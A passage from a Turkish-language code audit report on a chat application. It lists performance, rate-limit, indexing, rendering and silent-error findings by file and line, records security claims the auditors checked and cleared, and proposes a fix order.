| 2   | `lib/socket/handlers/presence.ts:72`                            | `presence:activity` rate limit'siz **ve no-op kontrolsüz**; zaten ONLINE olan kullanıcının tekrar ONLINE'ı iki Postgres okuması + Redis pipeline + tüm sunuculara fan-out yapıyor. 10 sunucu × 5k çevrimiçi = tek olaydan 50k teslimat.                                                                                                                                                                                                                                   | H·S          |
| 3   | `schema.prisma`                                                 | **Eksik indeksler**, hepsi sorgusuyla kanıtlı: `AppSession[userId,lastSeenAt]` (son görülme `MAX` — tablo hiç budanmıyor), `ChannelReadState[channelId,lastReadAt]` (her bahis teslimatı kanaldaki tüm okuma durumlarını heap'ten çekiyor), `FriendRequest[senderId,status]`+`[receiverId,status]` (her presence değişiminde), `ClientHealthEvent[createdAt]`, `Notification[userId,read,createdAt]`, `Attachment[userId]`, `AppSession[startedAt]`, `Session[expiresAt]` | H·S          |
| 4   | `lib/friends/service.ts:670`                                    | Kullanıcı arama `ILIKE '%…%'` — B-tree kullanılamaz, her aramada tam `User` taraması. Minimum terim 2 karakter. Repo `pg_trgm`'i mesajlar için zaten kurmuş. Aynı eksik `DMMessage.content` için de var (`search-service.ts:426`).                                                                                                                                                                                                                                        | H·M          |
| 5   | `lib/admin/snapshots/overview.ts:40`                            | `UserDailyMetric` `take`'siz, 2× pencere (180 güne kadar). 50k kullanıcıda milyonlarca satır Node belleğine. Kardeş loader aynı tabloyu `SCAN_LIMIT` ile sınırlıyor.                                                                                                                                                                                                                                                                                                      | H·M          |
| 6   | `lib/admin/notification-campaigns.ts:575`, `:269`               | Kampanya gönderimi alıcı başına **2 sıralı yazma**, istek içinde (10k alıcı = 20k sorgu, kesin gateway timeout). Alıcı sayımı tüm kullanıcı id'lerini çekip `.length` okuyor, önizleme bütçesi 60/dk.                                                                                                                                                                                                                                                                     | H·M          |
| 7   | `lib/badges/badge-sweep.ts:82`, `:164`, `:201`                  | Founder sweep'i tüm `Server`'ı satır başına üye sayımıyla tarıyor — bakımı yapılan `Server.memberCount` kolonu varken. Moderasyon sweep'i **tüm zamanların** ACTIONED vakalarını okuyup her saat idempotent olmayan yazma yapıyor; yazma hacmi süresiz büyüyor. Süresi dolan rozetler `count()` yerine `findMany().length`.                                                                                                                                               | H·S/M        |
| 8   | `app/api/v1/servers/route.ts:24`                                | `POST /servers` **rate limit'siz**; tanımlı `server:create` bütçesi (10/saat) hiçbir rotadan referanslanmıyor — ölü kod. Her çağrı 1 Server + 3 Role + üyelik + kategori + kanallar yazan bir işlem.                                                                                                                                                                                                                                                                      | H·S          |
| 9   | `app/api/v1/attachments/[attachmentId]/download/route.ts:57`    | Ek indirme proxy'si rate limit'siz — ağaçtaki tek limitsiz kimlikli rota. 32 MB video döngüsü hem UploadThing hem Railway egress'ini faturalandırıyor.                                                                                                                                                                                                                                                                                                                    | H·S          |
| 10  | `lib/attachments/scanner.ts:198`                                | Ek indirmesinde `AbortSignal` yok; outbox seri ve tek-uçuşlu drene ettiği için **tek asılı fetch** DM bildirimlerini, kanal bildirimlerini, analitiği ve kampanyaları undici'nin 300 sn varsayılanı boyunca durduruyor — ki bu `OUTBOX_STALE_PROCESSING_MS`'e eşit.                                                                                                                                                                                                       | H·S          |
| 11  | `lib/dm/realtime-service.ts:125`                                | Outbox satırı tüm roster'ı 7 alanlı tam kullanıcı nesneleriyle serileştiriyor; iş yalnız `locale` okuyor. 32 kişilik grupta mesaj başına birkaç KB gereksiz JSON, gönderim işlemi içinde yazılıp worker'da geri okunuyor.                                                                                                                                                                                                                                                 | M·S          |
| 12  | `lib/dm/disappearing-worker.ts:108`                             | Süre dolma fan-out'u konuşma başına bir `void` roster sorgusu atıyor — 500'lük partide 200 konuşma = eşzamanlı 200 sorgu, 60 sn'de bir, bağlantı havuzu sıçraması.                                                                                                                                                                                                                                                                                                        | M·S          |
| 13  | `lib/dm/service.ts:1183`                                        | Paylaşılan medya toplamı, konuşmanın tüm geçmişi üzerinde sınırsız ve indekssiz `count`, her detay ekranı açılışında.                                                                                                                                                                                                                                                                                                                                                     | M·M          |
| 14  | `lib/analytics/service.ts:452`                                  | Ses odasından çıkış: oturum × UTC gün × Serializable rozet işlemi üçlü iç içe sıralı döngü — VOICE+CAMERA+SCREEN_SHARE ile ~18-20 sıralı round trip, istek yolunda.                                                                                                                                                                                                                                                                                                       | M·M          |
| 15  | `schema.prisma`                                                 | **9 gereksiz indeks** unique kısıtın birebir kopyası: `User.email`, `User.username`, `Session.token`, `Session.refreshToken`, `Server.inviteCode`, `ServerInvite.code`, `Reaction.messageId`, `DMReaction.messageId`, `Role.name`. En sık yazılan tablolarda saf yazma amplifikasyonu. Şema yazarı aynı gerekçeyi `GroupInvite:1558`'de kendisi yazmış.                                                                                                                   | M·S          |
| 16  | `schema.prisma:723`                                             | `Session` satırları hiç süpürülmüyor ve `expiresAt` indekssiz — her giriş kalıcı bir bearer+refresh token satırı bırakıyor, yedeklerde de duruyor.                                                                                                                                                                                                                                                                                                                        | M·S          |
| 17  | `lib/friends/queries.ts:80` · `lib/friends/service.ts:368`      | Üç arkadaş okuma ucu `take`'siz ve rate limit'siz. Presence yayını her durum değişiminde iki sınırsız sorgu ile hedef setini sıfırdan kuruyor; aynı sorgu ses fan-out'unda tekrar ediyor.                                                                                                                                                                                                                                                                                 | M·M          |
| 18  | `lib/social/mobile-user-profile-service.ts:293`                 | Ortak arkadaş, iki tarafın tam arkadaş listesini belleğe çekip JS'te kesiştiriyor; her profil kartı açılışında.                                                                                                                                                                                                                                                                                                                                                           | M·M          |
| 19  | `lib/settings/bootstrap.ts:19`                                  | Ayarlar bootstrap'i her istekte `package.json`'ı diskten okuyup parse ediyor ve `Contributor` tablosunu tam tarıyor; rota rate limit'siz.                                                                                                                                                                                                                                                                                                                                 | M·S          |
| 20  | `lib/moderation/case-queries.ts:204`                            | Vaka dosyası raporları, olayları ve delilleri `take`'siz çekiyor; brigadlanmış hesapta tek vaka binlerce satır. Mobil ikizi doğru şekilde `take: 5` yapıyor.                                                                                                                                                                                                                                                                                                              | M·M          |
| 21  | `lib/servers/server-public-profile-service.ts:99`               | Herkese açık sunucu profili tüm kanalları `take`'siz çekiyor, kanal başına iki LATERAL alt-sorgu ve iki izin çözümlemesi. Kimliksiz erişilebilir; 500 kanal = istek başına 1000 izin çözümlemesi.                                                                                                                                                                                                                                                                         | M·S          |
| 22  | `lib/workspace/permission-service.ts:814`                       | Soğuk açılışta sunucu başına ayrı Redis komut seti — 50 sunucu ≈ 100 round trip, tek `MGET` yeterken.                                                                                                                                                                                                                                                                                                                                                                     | M·M          |
| 23  | `app/api/v1/mobile/bootstrap/route.ts:258`                      | İki bağımsız okuma mevcut iki `Promise.all` partisinden **sonra** sıralı koşuyor, üstelik `timing.measure` dışında.                                                                                                                                                                                                                                                                                                                                                       | M·S          |
| 24  | `app/api/v1/channels/[channelId]/read/route.ts:84`              | Kanal okundu işaretleme iki bağımsız mesaj aramasını sıralı bekliyor; aynı dosya 37. satırda `Promise.all` kullanıyor. Mobil ikizinde 6 dalga (`mobile/.../read/route.ts:51`).                                                                                                                                                                                                                                                                                            | M·S          |
| 25  | `lib/socket/server.ts:619`                                      | Her soket bağlantısı, kullanıcıların ~%100'ü moderatör olmamasına rağmen `adminMembership` tam listesini sorguluyor. Deploy sırasında yeniden bağlanma dalgasında istemci başına bir tane.                                                                                                                                                                                                                                                                                | M·S          |
| 26  | `lib/socket/handlers/voice.ts:78`, `:245`                       | `voice:states:watch` rate limit'siz ve her çağrıda tüm görünür ses kanallarının izleyici odalarını bırakıp yeniden katılıyor (60 kanal = 120 adaptör mutasyonu). `voice:screenshare:update` rate limit'siz ve her olay `MediaUsageSession` yazması yapıyor.                                                                                                                                                                                                               | M·S          |

### Web istemci

| #   | Yer                                           | Sorun                                                                                                                                                                                                                                                  | Kazanım·Efor |
| --- | --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------ |
| 27  | `components/chat/message-list.tsx:454`        | Mesaj dökümü **hiç sanallaştırılmıyor**; sonsuz sorgu sayfa sayfa ekliyor. 20 sayfa = DOM'da 1000 `MessageItem`, her biri `ReactMarkdown` ağacı + `LinkPreviewCard`. Bellek hiç geri verilmiyor.                                                       | H·L          |
| 28  | `components/chat/chat-area.tsx:314`           | `handleReply` `useCallback`'siz — `MessageItem` memo karşılaştırıcısının kimlikle baktığı **tek** prop. Karşılaştırıcı tamamen ölü; karşı taraf yazarken saniyede birkaç kez tüm döküm yeniden render oluyor.                                          | H·S          |
| 29  | `hooks/use-messages.ts:375`                   | `queryKey` her render yeni dizi ve iki `useEffect`'in bağımlılığı → her render **11 soket dinleyicisi** sökülüp takılıyor. Aynı dosyanın üçüncü effect'i doğru yapıyor.                                                                                | H·S          |
| 30  | `components/chat/message-list.tsx:279`        | `allMessages` render gövdesinde hesaplanıyor → iki `useMemo` ve bir `useEffect` sessizce ölü; 500 mesajlık dökümde render başına ~1500 `new Date()`.                                                                                                   | H·S          |
| 31  | `components/providers/voice-provider.tsx:5`   | `livekit-client` + 3074 satırlık canlı provider + 838 satırlık E2E mock, `(main)` altındaki **her sayfanın** ilk paketinde. Seçim çalışma zamanında yapıldığı için bundler eleyemiyor.                                                                 | H·M          |
| 32  | `components/shell/wizards-shell.tsx:790`      | Tek profil güncellemesi `["messages"]` önekiyle eşleşen **tüm** konuşmaların tüm sayfalarını koşulsuz yeniden inşa ediyor; hiç eşleşme olmasa bile.                                                                                                    | M·S          |
| 33  | `components/chat/message-list.tsx:110`        | Her yeni mesaj **dokuz** zorlanmış scroll+layout geçişi planlıyor (5 rAF + 4 timeout, 700 ms'e kadar).                                                                                                                                                 | M·S          |
| 34  | `components/shared/notification-bell.tsx:183` | Her gelen bildirim, bir satır önce iyimser olarak artırılan okunmamış sayacı için gerçek bir HTTP GET tetikliyor — sekme başına.                                                                                                                       | M·S          |
| 35  | `components/chat/chat-area.tsx:341`           | Capture fazında pencere scroll dinleyicisi, rAF kısıtlaması olmadan layout okuyup `setState` çağırıyor; menü açıkken döküm kaydırmak en kötü durum. Aynı desen `message-search-panel.tsx:129` ve `message-toolbar.tsx:139`'da (satır başına bir tane). | M·S          |
| 36  | `components/chat/message-item.tsx:1328`       | Memo karşılaştırıcısı `avatarUrl`, `displayName`, `authorColor`, `mode`, `readReceipt` alanlarını atlıyor — #28 düzeltilince bunlar bayatlar. **İkisi birlikte düzeltilmeli.**                                                                         | M·S          |

### Mobil istemci

| #   | Yer                                                                                    | Sorun                                                                                                                                                                                                                                                                                                                             | Kazanım·Efor |
| --- | -------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------ |
| 37  | `app/providers/mobile-realtime-provider.tsx:282`                                       | Her olay — typing dâhil — bağlantı anlık görüntüsünü dispatch ediyor, yeni context değeri üretiyor, ürün kökünü + ~10 screen-props bloğunu + navigator'ı render ediyor. Typing store'un kaldırmak için yazıldığı regresyonun aynısı. _İki ajan doğruladı._                                                                        | H·M          |
| 38  | `app/features/use-mobile-messaging-feature.ts:634`, `:623`                             | `retryFailedMessage` TanStack **mutation sonuç nesnesini** dep tutuyor (her render yeni) → iki kök screen-props memo'su hiç tutmuyor. Aynı hata `use-mobile-group-chat.ts:103`'te. **Çare:** dep'te `.mutate`.                                                                                                                    | H·S          |
| 39  | `app/providers/mobile-voice-provider.tsx:125`                                          | Context değeri `voiceRoom` nesne literaline bağlı; çağrı sırasında ~11×/sn tüm uygulamaya yeni değer.                                                                                                                                                                                                                             | H·M          |
| 40  | `voice/use-mobile-voice-room.ts:928`                                                   | 90 ms ses seviyesi ticker'ı arka planda durmuyor — AppState handler'ı kamerayı ve ekran paylaşımını askıya alıyor, ticker'a dokunmuyor. 10 kişilik odada ~110 native `getStats()`/sn, ekran kapalı. Ayrıca `:1916` ses yolu yoklaması 4 sn'de bir arka planda devam ediyor.                                                       | H·S          |
| 41  | `app/providers/mobile-push-response-bridge.tsx:42`                                     | Her soket olayında `setNotificationHandler` yeniden atanıp native abonelik sökülüp takılıyor — "bir kez mount edilir" sözleşmesinin tersi.                                                                                                                                                                                        | H·S          |
| 42  | `realtime/realtime-query-bridge.ts:328`                                                | Arkadaş olmayan birinin `presence:update`'i, cache zaten başarıyla yamalanmışken workspace detayını (backend'in en ağır okuması) invalidate ediyor. 50 kişilik sunucuda sürekli.                                                                                                                                                  | H·S          |
| 43  | `realtime/mobile-realtime-contract.ts:142`                                             | `dm:conversation:delivered` hiçbir kaynak setinde değil → catch-all `bootstrap` invalidasyonuna düşüyor. Gönderilen her mesajın teslim makbuzu ~21 KB bootstrap'i JS thread'inde yeniden parse ettiriyor.                                                                                                                         | H·S          |
| 44  | `app/screens/dm-inbox.tsx:506`                                                         | `typingNames={… ?? []}` — satır başına taze dizi, `React.memo`'yu tamamen öldürüyor. Repo bu tuzağı `EMPTY_PARTICIPANTS` ile başka yerde çözmüş.                                                                                                                                                                                  | H·S          |
| 45  | `app/screens/notifications-screen.tsx:120`, `:335`                                     | Besleme render gövdesinde `flatMap` + `new Date()` ile yeniden gruplanıyor (memo yok) **ve** sanallaştırma gün gruplarının üzerinde — her yüklü bildirim aynı anda mount. `notifications-screen-model.ts:123` bildirim başına yeni `Intl.DateTimeFormat` kuruyor.                                                                 | H·S/M        |
| 46  | `app/screens/workspace-channel-section-list.tsx:68`, `:88`, `:96`                      | FlashList `data` render gövdesinde yeniden kuruluyor (çağıranın `useMemo`'su boşa gidiyor), `renderItem` satır içi, ve satır başına tüm ses durumu dizisinde lineer `find`. Presence tick'inde güncellenen yüzey.                                                                                                                 | H·S          |
| 47  | `app/screens/dm-conversation-screen.tsx:475`                                           | `onDeleteMessage` satır içi ok → `renderItem` yeniden basılıyor → tüm mount edilmiş balonlar yeniden render. Kanal ekranı bunu doğru yapıyor.                                                                                                                                                                                     | H·S          |
| 48  | `social/friends-hub.tsx:1040`                                                          | Tüm arkadaş listesi (sayfalama yok) düz `ScrollView`'da; iki `filter` her render yeniden koşuyor; satır başına `ContextMenu` + 3 elemanlı taze dizi. Bu dilimdeki diğer tüm listeler `FlashList` kullanıyor.                                                                                                                      | H·M          |
| 49  | `workspace/mobile-role-detail-screen.tsx:111`                                          | Kendini tetikleyen effect: `rolesQuery` her render yeni proxy → `role` bulunamazsa **sınırsız refetch döngüsü**. Silinen role deep link ile veya `deleteRole`'ün iyimser güncellemesiyle tetiklenebilir; ekran kalıcı iskelet gösterirken istek fırtınası atıyor.                                                                 | H·S          |
| 50  | `media/mobile-message-attachment-upload.ts:31` · `media/use-mobile-image-upload.ts:49` | Mesaj eki (sesli notlar dâhil) ve avatar/banner/sunucu ikonu yüklemelerinde **watchdog yok**. Asılan istek `uploading`/`isBusy` durumunu kalıcı true bırakıyor; kullanıcı hiçbir hata görmüyor, ekranı terk etmeden tekrar deneyemiyor. `createMobileUploadWatchdog` tam bunun için yazılmış, yalnız geri bildirim akışına bağlı. | H·S          |
| 51  | `app/screens/group-create/member-step.tsx:280`, `:121`                                 | Tüm roster düz `ScrollView`'da `.map()` ile, canlı arama alanının arkasında; seçim testi satır başına lineer `includes`. 400 arkadaş × 31 seçim ≈ tuş başına 12.000 karşılaştırma.                                                                                                                                                | M·M          |
| 52  | `app/screens/voice-screen.tsx:194`                                                     | Ekranın tepesinde 1 Hz saat; çağrı boyunca tüm oda alt ağacını, her video karosunu ve seyirci rayını **saniyede bir** yeniden render ediyor — sadece `m:ss` etiketi için.                                                                                                                                                         | M·S          |
| 53  | `media/mobile-image-picker.ts:173`                                                     | Çoklu görsel seçiminde `Promise.all` ile eşzamanlı decode; 3 × 12 MP ≈ 100 MB+ native bitmap, düşük bellekli Android'de OOM.                                                                                                                                                                                                      | M·S          |
| 54  | `app/components/kit/overlay-surface.tsx:205`                                           | Her render registry'ye taze React elementi yazılıyor → registry'nin belgelenmiş dedup koruması **erişilemez**; açık her overlay'in sahibi render oldukça tüm uygulama ağacını saran iki dinleyici bildiriliyor.                                                                                                                   | M·M          |
| 55  | `app/components/message-primitives.tsx:954`                                            | `MessageStream` `renderItem`'ı satır içi ok; `MemoizedMessagePreviewRow` her görünür satır için baypas ediliyor. DM listesi bunu `useCallback` ile doğru yapıyor.                                                                                                                                                                 | M·S          |
| 56  | `notifications/mobile-notification-query.ts:110`                                       | Tek bildirim okundu işaretleme **tüm workspace anahtar önekini** invalidate ediyor (her sunucunun detayı, üyeleri, rolleri, davetleri) ve mutasyon dört invalidasyonu bekliyor. N satıra dokunmak N kez.                                                                                                                          | M·S          |
| 57  | `dm/mobile-group-client.ts:519`                                                        | `joinViaInvite.onSuccess` invalidasyon promise'ini **döndürüyor** → katılım sonrası navigasyon DM envanteri refetch'ini bekliyor, düğme `busy` kalıyor. Aynı şekil `addMembers`/`setMuted`/`update`'te.                                                                                                                           | M·S          |
| 58  | `performance/mobile-performance-sample-persistence.ts:94`                              | Kalıcılık kuyruğu sınırsız; SQLCipher kilitliyken 30 sn geri çekilme boyunca her navigasyon ve liste yüklemesi kuyruğa ekliyor — ölçmesi gereken bozuk cihazda sınırsız büyüyen enstrümantasyon.                                                                                                                                  | M·S          |

---

## P2 — Kalite ve sessiz hatalar

**Sessiz mutasyon hataları (kullanıcı hiçbir şey görmüyor):**

- `social/mobile-social-query.ts:338` — **`reportUser` mutasyonunun `onError`'ı yok** ve tüm çağıranlar yazma çözülmeden sheet'i kapatıyor. `retry: 0` olduğundan tek bir 5xx son. Kullanıcı "Taciz" seçiyor, sheet kapanıyor, hiçbir şey gösterilmiyor — taciz raporunun gittiğini sanıyor. **H·S**
- `social/friends-hub.tsx:754`, `:1430` — `removeFriend`/`blockFriend`/`unblockFriend` `onError`'sız `.mutate()`. Kötü bağlantıda engelleme sessizce başarısız, satır yerinde kalıyor. **H·S**
- `social/profile-card/profile-card-overlay.tsx:270`, `:245`, `:325`, `:344` — dört aksiyon `void (async …)()` içinde `catch`'siz `await`; `createRequest`'in normal sunucu yanıtları (`ALREADY_PENDING`, `BLOCKED`) unhandled rejection oluyor. `friends-hub` aynı hataları düzgün karşılıyor. **M·S**
- `social/friends-hub.tsx:613` — `openDM` dört çağıranda `void`; başarısızlık ölü dokunuş gibi görünüyor. **M·S**
- `workspace/mobile-server-invites-screen.tsx:79` — davet oluşturma hatası boş `catch`'e gidiyor, ekranda hiçbir hata yüzeyi yok. **M·S**
- `workspace/mobile-server-invites-screen.tsx:267` — silme onayı sheet'i `finally`'de kapatıyor, sheet'in göstereceği hatayı yok ediyor; davet kayboluyor ve sessizce geri geliyor. Kardeş ekranların hepsi bilerek yeniden fırlatıyor. **M·S**

**Veri/durum bozulmaları:**

- `query/mobile-profile-cache.ts:344` — banner yaması cache'i **sarmalanmış** şekilde okuyor, saklanan sarmalanmamış → herhangi bir profil kartı cache'te varsa kaydetme `TypeError` atıyor ve başarı toast'ını atlıyor. Testin fixture'ı yanlış şekli besliyor. **H·S**
- `workspace/mobile-channel-settings-screen.tsx:60` — arka plan workspace refetch'i kullanıcının yazmakta olduğu kanal adını/konusunu eziyor. Kardeş profil editörü bunu `baselineSignature` ile koruyor. **M·S**
- `workspace/mobile-workspace-create-sheets.tsx:148` — kanal oluşturma retry'ı, başarılı olmuş kategori oluşturmayı tekrar çalıştırıyor → aynı adda çoğalan kategoriler, temizleyen yok. **M·S**
- `workspace/mobile-role-detail-screen.tsx:84` — rol üye listesi infinite query'yi hiç sayfalamıyor; 50'den fazla üyesi olan sunucuda 51. üyeye rol verilemiyor, kesildiğine dair uyarı da yok. **M·M**
- `lib/socket/handlers/dm.ts:389` — `dm:call:leave` yetki kontrolünü roster güncellemesinden önce yapıyor; çağrı sırasında çıkarılan/engellenen kullanıcı kalıcı hayalet oluyor ve sonraki çağrıda çaldırılmıyor. **M·S**
- `lib/dm/group-call-state.ts:215` — grup çağrısı roster'ı atomik olmayan Redis read-modify-write; aynı tur içinde iki kabul birbirini siliyor. Modülün yorumu bu yarışı kabul edilmiş sayıyor ama kabul edilen sonuç iddia edilenden kötü: roster'ı boşaltan bir çıkış eşzamanlı katılanı da siliyor ve düzeltecek olay yok. **M·M**
- `lib/messages/attachments.ts:161` — ek talebi `findMany` ile doğrulayıp birincil anahtarla yeniden bağlıyor; eşzamanlı iki gönderim aynı eki yeniden ebeveynleyebiliyor, ilk mesaj sessizce eksiz kalıyor. **L·S**
- `lib/appearance/actions.ts:52` — tema iki tabloya işlemsiz yazılıyor ve `UserSettings.theme` hatası yutulup yine `success: true` dönüyor. **L·S**

**Kaynak sızıntıları (mobil):**

- `media/mobile-voice-message-recorder.ts:238` — gönderilen her sesli notun m4a'sı cache'te kalıyor (~1 MB/dk); yalnız "çok kısa" ve "vazgeç" yolları temizliyor. **M·S**
- `media/mobile-image-compression.ts:187` — reddedilen her yeniden kodlama geçişi diske dosya yazıp bırakıyor; bir fotoğraf 2 yetim dosya + saklanan bırakabiliyor. **M·S**
- `media/mobile-voice-message-recorder.ts:122` — kayıt sırasında unmount yalnız metre zamanlayıcısını durduruyor: kayıt durdurulmuyor, dosya silinmiyor, ses modu playback'e geri verilmiyor. **L·S**
- `workspace/mobile-server-invites-screen.tsx:88` — "kopyalandı" zamanlayıcısı ne temizleniyor ne tekilleştiriliyor. **M·S**
- `query/mobile-message-prefetch.ts:128` — üç modül seviyesi `Set` süreç ömrü boyunca büyüyor ve oturum silme temizliğinde yer almıyor; çıkıştan sonra önceki hesabın konuşma id'leri bellekte kalıyor. **L·S**
- `lib/socket/handlers/typing.ts:79` — DM katılımcı cache'i soket ömrü boyunca büyüyor, süresi geçen girdiler okunup geçiliyor ama silinmiyor. **L·S**

**Ölü / yanıltıcı kod:**

- `dm/mobile-group-client.ts:471` — `groupMembers` anahtarı invalidate ve patch ediliyor ama hiçbir query onu okumuyor. **L·S**
- `lib/messages/attachment-visibility.ts:68` — sahip-baypas dalı erişilemez (DTO'da `userId` yok, beş çağıranın hepsi `null` geçiyor); yazarın kendi taranan yüklemesi diğer oturumlarında `url: null` geliyor. **L·S**
- `packages/db/prisma/prisma.config.ts:7` — Prisma yalnız `prisma/rebaseline-migrations`'ı okuyor; yanında 37 migration'lık `migrations/` ve bir yedek dizin duruyor. Şu an zararsız ama alışkanlıkla oraya yazılan bir migration sessizce hiç koşmaz. **L·S**
- `packages/types/src/mobile.ts:1319` — `logExcerpt` Zod'da 200.000 karakter, sunucu yalnız **satır sayısıyla** kırpıyor: tek satırlık minified log tam boyutta kolona giriyor, kolonun uzunluk sınırı yok. **L·S**
- `lib/messages/search-client.ts:61` — `searchMessages` abort signal almıyor; 220 ms debounce'ı geçen her eskimiş sorgu sunucuda tam koşuyor ve `message:search` bütçesinden slot yiyor — hızlı yazan kullanıcı kendini limitliyor. **L·S**

---

## Doğrulanıp elenenler

Ajanlar bu iddiaları kontrol edip **sorun olmadığını** doğruladı — tekrar denetlemeye gerek yok:

- `api/e2e/**` yardımcıları üç bağımsız kapının (NODE_ENV, `E2E_TEST_MODE`, loopback host) arkasında fail-closed.
- 37 admin rotasının hepsi capability iddia ediyor; refresh token replay'inde tüm aile iptal ediliyor; her secret karşılaştırması `timingSafeEqual`.
- Hiçbir `$queryRaw`'da string interpolasyon yok; üç arama yolu tam parametreli, LIKE'larda `ESCAPE` var.
- İstek gövdesi hiçbir yerde spread ile Prisma `data:`/`where:`'e ulaşmıyor; istemciden gelen her `limit` `.max()` ile sınırlı.
- `requireDMParticipant` fail-closed ve geçmiş tabanını beş DM okuma yoluna veriyor; grup yetki bağlamı boş katılımcı ilişkisinde MEMBER'a düşmek yerine fırlatıyor.
- Grup üyelik ekleme yolları `pg_advisory_xact_lock` alıyor ve tavanları işlem içinde yeniden kontrol ediyor. _(Çıkarma yolu almıyor — P0-veri #17.)_
- Link önizleme ve ek proxy'si özel IP'leri DNS-pinned `createPublicLookup` ile engelliyor, yönlendirme ve zaman aşımı sınırları var. _(Ayrı bir hata: `all: true` — P0-veri #3.)_
- Arama servisindeki keyset cursor'ları bileşik ve off-by-one'sız; `to` tarih filtresi `datetime-local` girdisiyle doğru.
- Push `priority: "default"` fallback'i erişilemez (tek çağıran `"high"` geçiyor); analitik salt fallback'i üretimde erişilemez (`env.ts:109` `AUTH_SECRET` zorunlu kılıyor).

---

## Uygulama sırası önerisi

**1. gün — S efor, en yüksek risk (17 madde):**
P0-Güv 2, 6, 9, 10, 11, 12, 13, 14, 19, 20, 21, 23, 24 · P0-Veri 1, 2, 3, 4

**2. gün — indeksler + ölçek (aynı migration'da):**
P1-3 (8 eksik indeks), P1-15 (9 gereksiz indeksi düşür), P1-8, P1-9, P1-10 · P0-Veri 9, 10, 12, 13, 14

**3. gün — istemci render (birbirine bağlı, birlikte):**
P1-28+36 birlikte · P1-29, 30 · P1-37, 38, 39, 40, 41 · P1-42, 43, 44

**Ayrı iş olarak planlanmalı (M/L efor, tasarım kararı gerekir):**
P0-Güv 1 (deep link state), 3 (mobil iptal), 4 (OAuth 2FA), 5 (LiveKit metadata), 15 (alıcı bazlı DTO) · P0-Veri 11 (AuditLog yazarları) · P1-27 (mesaj listesi sanallaştırma), 31 (LiveKit paket bölme), 4 (trigram indeksleri)

---

_Bu raporda hiçbir kod değiştirilmedi. Tüm denetim salt-okunur koştu._
